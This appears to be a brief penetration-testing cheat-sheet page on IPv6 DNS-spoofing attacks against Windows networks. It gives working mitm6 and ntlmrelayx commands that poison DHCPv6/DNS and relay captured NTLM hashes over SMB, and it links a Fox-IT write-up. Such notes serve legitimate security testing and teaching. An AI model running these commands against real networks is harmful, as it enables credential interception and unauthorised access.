# IPv6 Attacks

## Brief

> All Windows versions since Windows Vista (including server variants) have **IPv6 enabled** and prefer it over IPv4.&#x20;
>
> IPv6 attacks abuses the default IPv6 configuration in Windows networks to **spoof DNS** **replies** by acting as a malicious DNS server and redirect traffic to an attacker specified endpoint.

## Basic Attack

First we start mitm6, which will start replying to DHCPv6 requests and afterwards to DNS queries requesting names in the internal network.

```bash
mitm6 -d $domain

# For the second part of our attack, we use  ntlmrelayx to relay the captured hashes. Now i will show two possible ways to use this tool, first through a simple SMB relay. 
ntlmrelayx.py -6 -tf Targets.txt -socks -smb2support
```

## More

{% embed url="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" %}
